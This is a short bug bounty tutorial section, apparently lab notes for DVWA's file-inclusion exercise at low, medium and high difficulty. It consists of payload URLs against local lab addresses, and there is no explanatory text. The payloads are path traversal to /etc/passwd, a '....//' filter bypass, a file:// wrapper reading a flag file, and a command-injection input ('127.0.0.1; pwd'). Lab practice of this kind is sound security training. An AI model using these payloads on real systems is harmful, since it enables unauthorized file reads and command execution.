# bug-bounty-tutorial
bug bounty tutorial

## 9.file-inclusion
### low
```
http://127.0.0.1:42001/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
http://10.10.229.208/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```
### medium
```
http://127.0.0.1:42001/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```
### high
#### in command injection
```
127.0.0.1; pwd
```
#### in file inclision
```
http://127.0.0.1:42001/vulnerabilities/fi/?page=file:///usr/share/dvwa/hackable/flags/fi.php
```
